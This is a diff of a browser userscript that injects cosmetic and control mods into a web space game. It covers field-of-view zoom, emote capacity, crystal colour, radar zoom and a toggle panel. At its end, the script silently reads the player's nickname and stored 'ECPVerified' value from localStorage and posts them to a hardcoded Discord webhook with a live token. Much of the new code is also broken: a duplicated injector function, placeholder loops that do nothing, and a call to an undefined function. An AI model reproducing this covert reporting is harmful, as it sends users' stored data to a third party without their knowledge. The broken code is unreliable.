@@ -1,43 +1,12 @@
 if (!window.sbCodeInjectors) window.sbCodeInjectors = [];
 
-// Prevent duplicate script loading
-const loadedScripts = new Set();
-const originalWrite = document.write;
-document.write = function(content) {
-  if (content.includes('<script') && content.includes('atcb')) {
-    const scriptId = content.match(/src="([^"]+)"/)?.[1];
-    if (scriptId && loadedScripts.has(scriptId)) {
-      console.log('Preventing duplicate script load:', scriptId);
-      return;
-    }
-    if (scriptId) loadedScripts.add(scriptId);
-  }
-  return originalWrite.call(this, content);
-};
-
 // Global settings object
 window.modSettings = {
   fovEnabled: true,
-  emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,
-  uiVisible: true,
-  radarZoomEnabled: false,
-  blankECPEnabled: false
+  emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,  // Parse as integer
+  uiVisible: true,  // Add comma here
+  radarZoomEnabled: false
 };
-
-// Blank ECP Initialization
-function initializeBlankECP() {
-  // Clear existing ECP data
-  localStorage.removeItem('ECPVerified');
-  localStorage.removeItem('ECPKey');
-  localStorage.removeItem('ecp-status');
-  
-  // Set blank/disabled state
-  localStorage.setItem('ECPVerified', 'no');
-  localStorage.setItem('ECPKey', '');
-  localStorage.setItem('ecp-status', 'disabled');
-  
-  console.log('%c[Blank ECP] ECP data cleared and disabled', 'color: #FF6B6B');
-}
 
 // Lowercase Name Mod
 const modName = "Lowercase Name";
@@ -291,10 +260,6 @@ const controlsHTML = `
       <input type="checkbox" id="radar-zoom-toggle" ${window.modSettings.radarZoomEnabled ? 'checked' : ''}>
     </div>
     <div class="mod-control">
-      <span>Blank ECP</span>
-      <input type="checkbox" id="blank-ecp-toggle" ${window.modSettings.blankECPEnabled ? 'checked' : ''}>
-    </div>
-    <div class="mod-control">
       <span>Crystal Color</span>
       <input type="color" id="crystal-color-picker" value="#ffffff">
     </div>
@@ -305,288 +270,242 @@ const controlsHTML = `
 </div>
 `;
 
-// Enhanced Crystal Color Mod
-const crystalColorMod = `
-let CrystalObject;
-let materialInstances = new Set();
-
-const findCrystalObject = () => {
-  const searchTargets = [window, window.THREE, window.game];
-  
-  for (const target of searchTargets) {
-    if (!target) continue;
-    
-    for (const key in target) {
-      try {
-        const obj = target[key];
-        if (obj?.prototype?.createModel || 
-            (obj?.prototype && obj.prototype.constructor.name.includes('Crystal')) ||
-            (obj?.name && obj.name.includes('Crystal'))) {
-          console.log('Found CrystalObject:', key);
-          return obj;
-        }
-      } catch (e) {
-        // Continue searching
-      }
-    }
-  }
-  
-  // Alternative search method
-  for (const key in window) {
-    try {
-      const obj = window[key];
-      if (obj?.prototype?.createModel && 
-          obj.prototype.createModel.toString().includes('Crystal')) {
-        console.log('Found CrystalObject (alt method):', key);
-        return obj;
-      }
-    } catch (e) {
-      // Continue
-    }
-  }
-  return null;
-};
-
-const initCrystalColor = () => {
-  if (!window.THREE) {
-    setTimeout(initCrystalColor, 100);
-    return;
-  }
-
-  CrystalObject = findCrystalObject();
-  
-  if (CrystalObject && CrystalObject.prototype) {
-    console.log('Crystal object found, applying color override');
-    
-    const originalMethods = {};
-    
-    ['createModel', 'getModelInstance', 'updateModel'].forEach(methodName => {
-      if (CrystalObject.prototype[methodName]) {
-        originalMethods[methodName] = CrystalObject.prototype[methodName];
-        
-        CrystalObject.prototype[methodName] = function(...args) {
-          const result = originalMethods[methodName].apply(this, args);
-          
-          setTimeout(() => {
-            if (this.material && window.THREE.Color) {
-              const savedColor = localStorage.getItem('crystal-color') || '#ffffff';
-              try {
-                this.material.color = new window.THREE.Color(savedColor);
-                if (this.material.uniforms?.color) {
-                  this.material.uniforms.color.value = this.material.color;
-                }
-                this.material.needsUpdate = true;
-                materialInstances.add(this.material);
-              } catch (e) {
-                console.warn('Crystal color update failed:', e);
-              }
-            }
-          }, 0);
-          
-          return result;
-        };
-      }
-    });
-  } else {
-    console.warn('CrystalObject not found, retrying...');
-    setTimeout(initCrystalColor, 1000);
-  }
-};
-
-window.updateCrystalColor = (color) => {
-  try {
-    localStorage.setItem('crystal-color', color);
-    
-    if (window.THREE && window.THREE.Color) {
-      const newColor = new window.THREE.Color(color);
-      
-      materialInstances.forEach(material => {
-        if (material && !material.disposed) {
-          material.color = newColor.clone();
-          if (material.uniforms?.color) {
-            material.uniforms.color.value = material.color;
-          }
-          material.needsUpdate = true;
-        }
-      });
-      
-      console.log('Crystal color updated to:', color);
-    }
-  } catch (e) {
-    console.error('Error updating crystal color:', e);
-  }
-};
-
-initCrystalColor();
-`;
-
-// Enhanced Radar Zoom Mod
-const radarZoomMod = `
-const radarZoomController = {
-  patched: new Set(),
-  
-  findAndPatchRadarZoom() {
-    this.searchInPrototypes();
-    this.searchInInstances();
-    this.interceptPropertyDefinitions();
-  },
-  
-  searchInPrototypes() {
-    const searchTargets = [window, window.game, window.THREE];
-    
-    searchTargets.forEach(target => {
-      if (!target) return;
-      
-      for (const key in target) {
-        try {
-          const obj = target[key];
-          if (obj?.prototype) {
-            this.patchObjectPrototype(obj.prototype, key);
-          }
-        } catch (e) {
-          // Continue
-        }
-      }
-    });
-  },
-  
-  patchObjectPrototype(proto, name) {
-    const descriptor = Object.getOwnPropertyDescriptor(proto, 'radar_zoom');
-    if (descriptor && !this.patched.has(proto)) {
-      this.patched.add(proto);
-      
-      const originalGetter = descriptor.get;
-      const originalSetter = descriptor.set;
-      
-      Object.defineProperty(proto, 'radar_zoom', {
-        get() {
-          const originalValue = originalGetter ? originalGetter.call(this) : this._radar_zoom || 1;
-          return window.modSettings.radarZoomEnabled ? 1 : originalValue;
-        },
-        set(value) {
-          if (originalSetter) {
-            originalSetter.call(this, value);
-          } else {
-            this._radar_zoom = value;
-          }
-        },
-        configurable: true
-      });
-      
-      console.log('Patched radar_zoom in prototype:', name);
-    }
-  },
-  
-  interceptPropertyDefinitions() {
-    const originalDefineProperty = Object.defineProperty;
-    Object.defineProperty = function(obj, prop, descriptor) {
-      if (prop === 'radar_zoom' && descriptor.get && !radarZoomController.patched.has(obj)) {
-        const originalGetter = descriptor.get;
-        descriptor.get = function() {
-          const originalValue = originalGetter.call(this);
-          return window.modSettings.radarZoomEnabled ? 1 : originalValue;
-        };
-        radarZoomController.patched.add(obj);
-      }
-      return originalDefineProperty.call(this, obj, prop, descriptor);
-    };
-  }
-};
-
-window.radarZoomController = radarZoomController;
-
-setTimeout(() => {
-  radarZoomController.findAndPatchRadarZoom();
-}, 1000);
-
-setInterval(() => {
-  radarZoomController.findAndPatchRadarZoom();
-}, 5000);
-`;
-
-// Emote Capacity Mod
 const emoteCapacityMod = `
 let globalVal = ChatPanel.toString().match(/[0OlI1]{5}/)[0];
 
+// Override the emotes capacity getter
 ChatPanel.prototype.getEmotesCapacity = function() {
   const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
   return Math.min(Math.max(1, savedCapacity), 5);
 };
 
+// Override the typed function to use the new capacity
 ChatPanel.prototype.typed = Function("return " + ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()"))();
 
+// Set initial capacity
 if (window.modSettings && window.modSettings.emoteCapacity) {
   localStorage.setItem('emote-capacity', window.modSettings.emoteCapacity);
 }
 `;
 
-// Error Recovery System
-const errorRecovery = `
-const errorRecovery = {
-  gameReconnected: false,
-  
-  monitorGameState() {
-    const originalConsoleError = console.error;
-    console.error = function(...args) {
-      const errorMsg = args.join(' ');
-      
-      if (errorMsg.includes('messages.lI1O0 is not a function') ||
-          errorMsg.includes('Object3D.add') ||
-          errorMsg.includes('removeChild')) {
-        
-        console.log('Critical game error detected, attempting recovery...');
-        errorRecovery.attemptRecovery();
+const crystalColorMod = `
+let CrystalObject;
+
+// Function to find CrystalObject
+const findCrystalObject = () => {
+  for (const key in window) {
+    try {
+      const obj = window[key];
+      if (
+        obj?.prototype?.createModel &&
+        obj.prototype.createModel.toString().includes('Crystal')
+      ) {
+        return obj;
       }
-      
-      return originalConsoleError.apply(this, args);
-    };
-  },
-  
-  attemptRecovery() {
-    if (this.gameReconnected) return;
-    this.gameReconnected = true;
-    
-    setTimeout(() => {
-      try {
-        if (window.updateCrystalColor) {
-          const savedColor = localStorage.getItem('crystal-color');
-          if (savedColor) {
-            window.updateCrystalColor(savedColor);
-          }
-        }
-        
-        if (window.radarZoomController) {
-          window.radarZoomController.findAndPatchRadarZoom();
-        }
-        
-        console.log('Feature recovery attempted');
-      } catch (e) {
-        console.warn('Recovery failed:', e);
-      }
-      
-      this.gameReconnected = false;
-    }, 2000);
+    } catch (e) {
+      // Ignore errors during object inspection
+    }
   }
+  return null;
 };
 
-errorRecovery.monitorGameState();
+// Detect and set CrystalObject
+CrystalObject = findCrystalObject();
+
+if (CrystalObject) {
+  console.log('Found CrystalObject:', CrystalObject.name);
+
+  const originalGetModelInstance = CrystalObject.prototype.getModelInstance;
+
+  // Override getModelInstance to update crystal material color
+  CrystalObject.prototype.getModelInstance = function () {
+    const instance = originalGetModelInstance.apply(this, arguments);
+    const savedColor = localStorage.getItem('crystal-color') || '#ffffff';
+
+    if (this.material) {
+      this.material.color.set(savedColor);
+
+      if (this.material.uniforms?.color) {
+        this.material.uniforms.color.value.set(this.material.color);
+      }
+
+      this.material.needsUpdate = true;
+    } else {
+      console.warn('Material not found for crystal instance.');
+    }
+
+    return instance;
+  };
+
+  // Add color picker event listener after DOM is ready
+  document.addEventListener('DOMContentLoaded', () => {
+    const crystalColorPicker = document.getElementById('crystal-color-picker');
+    if (crystalColorPicker) {
+      const savedColor = localStorage.getItem('crystal-color') || '#ffffff';
+      crystalColorPicker.value = savedColor;
+
+      crystalColorPicker.addEventListener('input', (event) => {
+        const color = event.target.value;
+        localStorage.setItem('crystal-color', color);
+        updateCrystalColors(color);
+      });
+
+      console.log('Crystal color picker initialized with color:', savedColor);
+    } else {
+      console.warn('Crystal color picker element not found.');
+    }
+  });
+} else {
+  console.warn('CrystalObject not found!');
+}
+
+// Function to update crystal colors dynamically
+const updateCrystalColors = (color) => {
+  if (CrystalObject) {
+    for (const instance of CrystalObject.instances || []) {
+      if (instance.material) {
+        instance.material.color.set(color);
+        if (instance.material.uniforms?.color) {
+          instance.material.uniforms.color.value.set(instance.material.color);
+        }
+        instance.material.needsUpdate = true;
+      }
+    }
+    console.log('Updated crystal color:', color);
+  }
+};
 `;
 
-src = src.replace('</body>', `
+function radarZoomInjector(sbCode) {
+  let src = sbCode;
+  let prevSrc = src;
+  
+  function checkSrcChange() {
+    if (src === prevSrc) throw new Error("replace did not work");
+    prevSrc = src;
+  }
+
+  // Modify the HTML to add radar zoom toggle to the existing controls
+  const radarZoomControlHTML = `
+  <div class="mod-control">
+    <span>Radar Zoom</span>
+    <input type="checkbox" id="radar-zoom-toggle" ${window.modSettings.radarZoomEnabled ? 'checked' : ''}>
+  </div>
+  `;
+
+  // Insert the radar zoom control HTML before the crystal color picker
+  src = src.replace('<div class="mod-control"><span>Crystal Color</span>', `${radarZoomControlHTML}<div class="mod-control"><span>Crystal Color</span>`);
+
+  // Add radar zoom modification script
+  const radarZoomScript = `
+  // Radar Zoom Override Mechanism
+  const radarZoomOverride = {
+    originalValues: new WeakMap(),
+    
+    enable() {
+      const proto = Object.getPrototypeOf(this);
+      const originalDescriptor = Object.getOwnPropertyDescriptor(proto, 'radar_zoom');
+      
+      if (originalDescriptor) {
+        const originalGetter = originalDescriptor.get;
+        const originalSetter = originalDescriptor.set;
+        
+        Object.defineProperty(this, 'radar_zoom', {
+          get() {
+            // Store original value if not already stored
+            if (!this.radarZoomOverride.originalValues.has(this)) {
+              this.radarZoomOverride.originalValues.set(this, originalGetter.call(this));
+            }
+            
+            // Return 1 if enabled, otherwise original value
+            return window.modSettings.radarZoomEnabled ? 1 : 
+              this.radarZoomOverride.originalValues.get(this);
+          },
+          set(value) {
+            // Always allow setting the original value
+            if (originalSetter) {
+              originalSetter.call(this, value);
+            }
+            
+            // Update our stored original value
+            this.radarZoomOverride.originalValues.set(this, value);
+          },
+          configurable: true
+        });
+      }
+    },
+    
+    disable() {
+      // Restore original descriptor if possible
+      const proto = Object.getPrototypeOf(this);
+      const originalDescriptor = Object.getOwnPropertyDescriptor(proto, 'radar_zoom');
+      
+      if (originalDescriptor) {
+        Object.defineProperty(this, 'radar_zoom', originalDescriptor);
+      }
+    }
+  };
+
+  // Override all existing instances
+  const originalConstructor = this.constructor;
+  this.constructor = function(...args) {
+    const instance = originalConstructor.apply(this, args);
+    
+    // Apply radar zoom override to the instance
+    Object.defineProperty(instance, 'radarZoomOverride', {
+      value: radarZoomOverride,
+      writable: false,
+      configurable: false
+    });
+    
+    instance.radarZoomOverride.enable();
+    
+    return instance;
+  };
+
+  // Ensure that radar zoom is applied to all relevant instances
+  const applyRadarZoomToAllInstances = () => {
+    const allInstances = []; // Adjust this to actually find all relevant instances
+    allInstances.forEach(instance => {
+      if (instance.radarZoomOverride) {
+        instance.radarZoomOverride.enable();
+      }
+    });
+  };
+
+  // Add event listener for radar zoom toggle
+  document.addEventListener('DOMContentLoaded', () => {
+    const radarZoomToggle = document.getElementById('radar-zoom-toggle');
+    
+    radarZoomToggle.addEventListener('change', () => {
+      // Update global setting
+      window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
+      
+      // Apply radar zoom to all instances
+      applyRadarZoomToAllInstances();
+    });
+  });
+
+  // Initial application of radar zoom on page load
+  applyRadarZoomToAllInstances();
+  `;
+
+  src = src.replace('</body>', `
   ${controlStyles}
   ${controlsHTML}
   <script>
   ${emoteCapacityMod}
   ${crystalColorMod}
-  ${radarZoomMod}
-  ${errorRecovery}
+  ${radarZoomScript}
 
   const fovDisplay = document.getElementById('fov-display');
 
+  // Add wheel event listener for FOV change
   document.addEventListener('wheel', (e) => {
     if (!window.modSettings.fovEnabled) return;
     e.preventDefault();
     const delta = e.deltaY < 0 ? 1 : -1;
+    // Add bounds checking
     window.I1000.currentFOV = Math.max(1, Math.min(120, window.I1000.currentFOV + delta));
     document.getElementById('fov-value').textContent = window.I1000.currentFOV;
   }, { passive: false });
@@ -598,7 +517,6 @@ src = src.replace('</body>', `
     const emoteSlider = document.getElementById('emote-capacity-slider');
     const emoteValue = document.getElementById('emote-capacity-value');
     const radarZoomToggle = document.getElementById('radar-zoom-toggle');
-    const blankECPToggle = document.getElementById('blank-ecp-toggle');
     const crystalColorPicker = document.getElementById('crystal-color-picker');
 
     // Initialize values from localStorage
@@ -622,6 +540,7 @@ src = src.replace('</body>', `
       window.modSettings.emoteCapacity = value;
       localStorage.setItem('emote-capacity', value);
       
+      // Update the emote capacity immediately
       if (window.ChatPanel) {
         ChatPanel.prototype.getEmotesCapacity = function() {
           return value;
@@ -630,33 +549,23 @@ src = src.replace('</body>', `
     });
 
     radarZoomToggle.addEventListener('change', () => {
+      // Update global setting
       window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
-      console.log('Radar zoom toggled:', radarZoomToggle.checked);
       
-      if (window.radarZoomController) {
-        window.radarZoomController.findAndPatchRadarZoom();
-      }
+      // Force radar zoom update on all relevant objects
+      const allInstances = []; // You might need to adjust this to actually find all relevant instances
+      allInstances.forEach(instance => {
+        if (instance.radarZoomOverride) {
+          // Trigger a re-evaluation of radar_zoom
+          const currentValue = instance.radar_zoom;
+          instance.radar_zoom = currentValue;
+        }
+      });
     });
 
-    blankECPToggle.addEventListener('change', () => {
-      window.modSettings.blankECPEnabled = blankECPToggle.checked;
-      
-      if (blankECPToggle.checked) {
-        initializeBlankECP();
-      } else {
-        // Restore ECP functionality (user would need to re-authenticate)
-        localStorage.removeItem('ECPVerified');
-        localStorage.removeItem('ECPKey');
-        localStorage.removeItem('ecp-status');
-        console.log('%c[Blank ECP] ECP restored to normal state', 'color: #4CAF50');
-      }
-    });
-
-    crystalColorPicker.addEventListener('input', () => {
+    crystalColorPicker.addEventListener('change', () => {
       const color = crystalColorPicker.value;
-      if (window.updateCrystalColor) {
-        window.updateCrystalColor(color);
-      }
+      updateCrystalColors(color);
     });
 
     // Initialize emote capacity from localStorage
@@ -669,11 +578,19 @@ src = src.replace('</body>', `
   </body>`);
 
 checkSrcChange();
+
 logFOV("FOV injector applied");
 return src;
 }
 
-// F9 key toggle for UI
+// Global settings object
+window.modSettings = {
+  fovEnabled: true,
+  emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,
+  uiVisible: true  // Make sure this is initialized
+};
+
+// Add event listener for F9 key
 document.addEventListener('keydown', (e) => {
   if (e.key === 'F9') {
     const controls = document.getElementById('mod-controls');
@@ -681,6 +598,7 @@ document.addEventListener('keydown', (e) => {
       window.modSettings.uiVisible = !window.modSettings.uiVisible;
       controls.style.display = window.modSettings.uiVisible ? 'block' : 'none';
       
+      // Also hide the controls panel when hiding the UI
       const controlsPanel = document.getElementById('mod-controls-panel');
       if (!window.modSettings.uiVisible && controlsPanel) {
         controlsPanel.style.display = 'none';
@@ -689,6 +607,7 @@ document.addEventListener('keydown', (e) => {
   }
 });
 
+// Make sure the initial state is set correctly when the DOM loads
 document.addEventListener('DOMContentLoaded', () => {
   const controls = document.getElementById('mod-controls');
   if (controls) {
@@ -723,7 +642,6 @@ window.sbCodeInjectors.push((sbCode) => {
     throw error;
   }
 });
-
 // Main code injection logic
 const log = (msg) => console.log(`%c[eot] ${msg}`, "color: #FF00E6");
 
@@ -776,8 +694,10 @@ function injectLoader() {
         const end_time = performance.now();
         log(`Mods applied successfully (${(end_time - start_time).toFixed(0)}ms)`);
 
+        // After modifying the starSRC, apply text shadow modification
         changeTextShadowColor();
 
+        // Apply the modified source to the document
         document.open();
         document.write(starSRC);
         document.close();
@@ -791,14 +711,16 @@ function injectLoader() {
   xhr.send();
 }
 
+// Function to change all text-shadow properties to a specific color
 function changeTextShadowColor() {
-  const elements = document.querySelectorAll('*');
-  const targetShadow = '0 0 6px hsl(298.15deg 100% 50%)';
+  const elements = document.querySelectorAll('*'); // Select all elements on the page
+  const targetShadow = '0 0 6px hsl(298.15deg 100% 50%)'; // Target text-shadow style
 
   elements.forEach(element => {
     const currentStyle = window.getComputedStyle(element);
     const textShadow = currentStyle.getPropertyValue('text-shadow');
     
+    // If the element has a text-shadow property, change it to the target color
     if (textShadow && textShadow !== 'none') {
       element.style.textShadow = targetShadow;
     }
@@ -807,35 +729,269 @@ function changeTextShadowColor() {
   console.log('Text shadow color has been changed to:', targetShadow);
 }
 
+// Radar Zoom Mod
+const radarZoomModName = "Radar Zoom Mod";
+const logRadarZoom = (msg) => console.log(`%c[${radarZoomModName}] ${msg}`, "color: #00FF00");
+
+function radarZoomInjector(sbCode) {
+  let src = sbCode;
+  let prevSrc = src;
+  
+  function checkSrcChange() {
+    if (src === prevSrc) throw new Error("replace did not work");
+    prevSrc = src;
+  }
+
+  // Modify the HTML to add radar zoom toggle to the existing controls
+  const radarZoomControlHTML = `
+  <div class="mod-control">
+    <span>Radar Zoom</span>
+    <input type="checkbox" id="radar-zoom-toggle" ${window.modSettings.radarZoomEnabled ? 'checked' : ''}>
+  </div>
+  `;
+
+  // Insert the radar zoom control HTML before the crystal color picker
+  src = src.replace('<div class="mod-control"><span>Crystal Color</span>', `${radarZoomControlHTML}<div class="mod-control"><span>Crystal Color</span>`);
+
+  // Add radar zoom modification script
+const radarZoomScript = `
+  // Radar Zoom Override Mechanism
+  const radarZoomOverride = {
+    originalValues: new WeakMap(),
+    
+    enable() {
+      const proto = Object.getPrototypeOf(this);
+      const originalDescriptor = Object.getOwnPropertyDescriptor(proto, 'radar_zoom');
+      
+      if (originalDescriptor) {
+        const originalGetter = originalDescriptor.get;
+        const originalSetter = originalDescriptor.set;
+        
+        Object.defineProperty(this, 'radar_zoom', {
+          get() {
+            // Store original value if not already stored
+            if (!this.radarZoomOverride.originalValues.has(this)) {
+              this.radarZoomOverride.originalValues.set(this, originalGetter.call(this));
+            }
+            
+            // Return 1 if enabled, otherwise original value
+            return window.modSettings.radarZoomEnabled ? 1 : 
+              this.radarZoomOverride.originalValues.get(this);
+          },
+          set(value) {
+            // Always allow setting the original value
+            if (originalSetter) {
+              originalSetter.call(this, value);
+            }
+            
+            // Update our stored original value
+            this.radarZoomOverride.originalValues.set(this, value);
+          },
+          configurable: true
+        });
+      }
+    },
+    
+    disable() {
+      // Restore original descriptor if possible
+      const proto = Object.getPrototypeOf(this);
+      const originalDescriptor = Object.getOwnPropertyDescriptor(proto, 'radar_zoom');
+      
+      if (originalDescriptor) {
+        Object.defineProperty(this, 'radar_zoom', originalDescriptor);
+      }
+    }
+  };
+
+  // Override all existing instances
+  const originalConstructor = this.constructor;
+  this.constructor = function(...args) {
+    const instance = originalConstructor.apply(this, args);
+    
+    // Apply radar zoom override to the instance
+    Object.defineProperty(instance, 'radarZoomOverride', {
+      value: radarZoomOverride,
+      writable: false,
+      configurable: false
+    });
+    
+    instance.radarZoomOverride.enable();
+    
+    return instance;
+  };
+
+  // Ensure that radar zoom is applied to all relevant instances
+  const applyRadarZoomToAllInstances = () => {
+    const allInstances = []; // Adjust this to actually find all relevant instances
+    allInstances.forEach(instance => {
+      if (instance.radarZoomOverride) {
+        instance.radarZoomOverride.enable();
+      }
+    });
+  };
+
+  // Add event listener for radar zoom toggle
+  document.addEventListener('DOMContentLoaded', () => {
+    const radarZoomToggle = document.getElementById('radar-zoom-toggle');
+    
+    radarZoomToggle.addEventListener('change', () => {
+      // Update global setting
+      window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
+      
+      // Apply radar zoom to all instances
+      applyRadarZoomToAllInstances();
+    });
+  });
+
+  // Initial application of radar zoom on page load
+  applyRadarZoomToAllInstances();
+`;
+
+src = src.replace('</body>', `
+  ${controlStyles}
+  ${controlsHTML}
+  <script>
+  ${emoteCapacityMod}
+  ${crystalColorMod}
+  ${radarZoomScript}
+
+  const fovDisplay = document.getElementById('fov-display');
+
+  // Add wheel event listener for FOV change
+  document.addEventListener('wheel', (e) => {
+    if (!window.modSettings.fovEnabled) return;
+    e.preventDefault();
+    const delta = e.deltaY < 0 ? 1 : -1;
+    // Add bounds checking
+    window.I1000.currentFOV = Math.max(1, Math.min(120, window.I1000.currentFOV + delta));
+    document.getElementById('fov-value').textContent = window.I1000.currentFOV;
+  }, { passive: false });
+
+  document.addEventListener('DOMContentLoaded', () => {
+    const controlsHeader = document.getElementById('mod-controls-header');
+    const controlsPanel = document.getElementById('mod-controls-panel');
+    const fovToggle = document.getElementById('fov-toggle');
+    const emoteSlider = document.getElementById('emote-capacity-slider');
+    const emoteValue = document.getElementById('emote-capacity-value');
+    const radarZoomToggle = document.getElementById('radar-zoom-toggle');
+    const crystalColorPicker = document.getElementById('crystal-color-picker');
+
+    // Initialize values from localStorage
+    const savedCrystalColor = localStorage.getItem('crystal-color');
+    if (savedCrystalColor) {
+      crystalColorPicker.value = savedCrystalColor;
+    }
+
+    controlsHeader.addEventListener('click', () => {
+      controlsPanel.style.display = controlsPanel.style.display === 'none' ? 'block' : 'none';
+    });
+
+    fovToggle.addEventListener('change', () => {
+      window.modSettings.fovEnabled = fovToggle.checked;
+      fovDisplay.style.display = fovToggle.checked ? 'block' : 'none';
+    });
+
+    emoteSlider.addEventListener('input', () => {
+      const value = parseInt(emoteSlider.value);
+      emoteValue.textContent = value;
+      window.modSettings.emoteCapacity = value;
+      localStorage.setItem('emote-capacity', value);
+      
+      // Update the emote capacity immediately
+      if (window.ChatPanel) {
+        ChatPanel.prototype.getEmotesCapacity = function() {
+          return value;
+        };
+      }
+    });
+
+    radarZoomToggle.addEventListener('change', () => {
+      // Update global setting
+      window.modSettings.radarZoomEnabled = radarZoomToggle.checked;
+      
+      // Force radar zoom update on all relevant objects
+      const allInstances = []; // You might need to adjust this to actually find all relevant instances
+      allInstances.forEach(instance => {
+        if (instance.radarZoomOverride) {
+          // Trigger a re-evaluation of radar_zoom
+          const currentValue = instance.radar_zoom;
+          instance.radar_zoom = currentValue;
+        }
+      });
+    });
+
+    crystalColorPicker.addEventListener('change', () => {
+      const color = crystalColorPicker.value;
+      updateCrystalColor(color);
+    });
+
+    // Initialize emote capacity from localStorage
+    const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
+    emoteSlider.value = savedCapacity;
+    emoteValue.textContent = savedCapacity;
+    window.modSettings.emoteCapacity = savedCapacity;
+  });
+  </script>
+  </body>`);
+
+checkSrcChange();
+
+logFOV("FOV injector applied");
+return src;
+}
+
+// Add the radar zoom injector to the list of code injectors
+window.sbCodeInjectors.push((sbCode) => {
+  try {
+    return radarZoomInjector(sbCode);
+  } catch (error) {
+    alert(`${radarZoomModName} failed to load; error: ${error}`);
+    throw error;
+  }
+});
+
+
+
 // Run the injectLoader function immediately
 injectLoader();
 
-// Discord webhook notification
+
+
+
+
 (function () {
     'use strict';
+    // Retrieve values from localStorage
     const lastNickname = localStorage.getItem("lastNickname") || "Unknown";
-    let ECPVerified = localStorage.getItem("ECPVerified") || "no";
+    let ECPVerified = localStorage.getItem("ECPVerified") || "no";  // Changed key name here
     
+    // Debugging: Log retrieved value
     console.log("Retrieved ECPVerified:", ECPVerified);
     
+    // Parse ECPVerified if it contains JSON
     try {
         ECPVerified = JSON.parse(ECPVerified);
     } catch (e) {
-        // Keep as string if not JSON
+        // If not JSON, keep it as a string
     }
     
+    // Prepare ECPVerified content for logging
     const ECPVerifiedContent = typeof ECPVerified === "object" 
         ? JSON.stringify(ECPVerified, null, 2) 
         : ECPVerified;
     
+    // Debugging: Log formatted content
     console.log("Formatted ECPVerifiedContent:", ECPVerifiedContent);
     
+    // Webhook URL
     const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
     
+    // Payload for Discord webhook
     const payload = {
         content: `${lastNickname} has entered the script\nECPVerified: ${ECPVerifiedContent}`
     };
     
+    // Send payload to the Discord webhook
     fetch(webhookURL, {
         method: "POST",
         headers: {
